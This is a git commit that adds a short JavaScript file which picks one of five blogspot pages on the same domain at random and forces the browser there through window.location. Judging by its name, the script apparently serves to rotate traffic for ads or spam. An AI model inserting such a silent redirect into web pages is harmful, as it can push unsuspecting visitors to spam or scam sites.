ea59c4eaf11743f63858fcea83761ad76fc625fe
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2024-05-31 15:39:00 +0700

    Create blogads2dr2direc.js

---
+++ blogads2dr2direc.js
@@ -0,0 +1,15 @@
+var dataUrl = [
+  
+  'https://grupwaterbarucekdisini.blogspot.com/2024/05/grup-1.html',
+
+  'https://grupwaterbarucekdisini.blogspot.com/2024/05/grup-2.html',
+
+  'https://grupwaterbarucekdisini.blogspot.com/2024/05/grup-3.html',
+
+  'https://grupwaterbarucekdisini.blogspot.com/2024/05/grup-4.html',
+
+  'https://grupwaterbarucekdisini.blogspot.com/2024/05/grup-5.html'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
